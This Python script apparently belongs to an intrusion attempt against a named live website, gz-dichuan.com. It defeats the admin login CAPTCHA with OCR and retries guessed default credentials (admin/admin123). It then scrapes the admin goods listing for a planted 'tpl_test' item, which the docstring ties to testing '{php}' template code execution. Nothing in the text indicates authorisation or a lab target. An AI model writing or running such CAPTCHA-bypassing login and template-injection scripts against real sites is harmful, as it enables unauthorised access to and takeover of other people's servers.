#!/usr/bin/env python3
"""gz: find tpl_test goods real id + locate generated static html + check {php} exec"""
import urllib.request, urllib.parse, re, http.cookiejar, base64, subprocess, sys

HOST = "http://gz-dichuan.com"
UA = {"User-Agent": "Mozilla/5.0", "Accept": "*/*"}

def ocr(img_bytes):
    b64 = base64.b64encode(img_bytes).decode()
    code = ("import ddddocr,base64; o=ddddocr.DdddOcr(show_ad=False); "
            "print(o.classification(base64.b64decode('%s')))" % b64)
    r = subprocess.run([sys.executable, "-c", code], capture_output=True, timeout=20, cwd="/tmp")
    return r.stdout.decode().strip()

cj = http.cookiejar.CookieJar()
op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

def fetch(url, data=None, timeout=15, headers=None):
    h = {**UA, "Content-Type": "application/x-www-form-urlencoded"}
    if headers: h.update(headers)
    try:
        req = urllib.request.Request(url, data=data.encode() if data else None, headers=h)
        r = op.open(req, timeout=timeout)
        return r.status, r.geturl(), r.read()
    except urllib.error.HTTPError as e:
        return e.code, url, e.read()
    except Exception as ex:
        return 0, url, str(ex).encode()

for attempt in range(10):
    try:
        code, final, body = fetch(HOST + "/index.php?m=admin&c=login&a=index")
        code, final, cap = fetch(HOST + "/index.php?m=admin&c=login&a=vertify",
                                 headers={"Referer": HOST + "/index.php?m=admin&c=login&a=index"})
        cap_text = ocr(cap)
        data = urllib.parse.urlencode({"username": "admin", "password": "admin123", "vertify": cap_text})
        code, final, resp = fetch(HOST + "/index.php?m=admin&c=login&a=login", data=data,
                                  headers={"Referer": HOST + "/index.php?m=admin&c=login&a=index",
                                           "X-Requested-With": "XMLHttpRequest"})
        rt = resp.decode("utf-8", "ignore")
        if "登录成功" in rt or '"status":1' in rt:
            print("login ok")
            break
    except Exception:
        pass

# search goods with keyword=tpl to find real id - look at raw HTML around tpl_test
code, final, body = fetch(HOST + "/index.php?m=admin&c=goods&a=index&keyword=tpl_test",
                          headers={"Referer": HOST + "/index.php?m=admin&c=index&a=index"})
bt = body.decode("utf-8", "ignore")
open("/tmp/gz_search_tpl.html", "w").write(bt)
i = bt.find("tpl_test")
print("tpl_test at:", i)
if i > 0:
    print("context:", bt[max(0,i-400):i+200].replace("\n", " ")[:500])

# extract ALL editdrugs links from search
ids = re.findall(r'editdrugs&drugs_id=(\d+)', bt)
print("search editdrugs ids:", ids)
# also look for row structure
rows = re.findall(r'<tr[^>]*>(.*?)</tr>', bt, re.S)
for r in rows:
    if "tpl_test" in r:
        cells = re.findall(r'<td[^>]*>(.*?)</td>', r, re.S)
        clean = [re.sub(r'<[^>]+>', '', c).strip()[:40] for c in cells]
        print("TPL ROW:", clean)
        # extract id
        mid = re.search(r'drugs_id=(\d+)', r)
        print("TPL ID:", mid.group(1) if mid else "?")
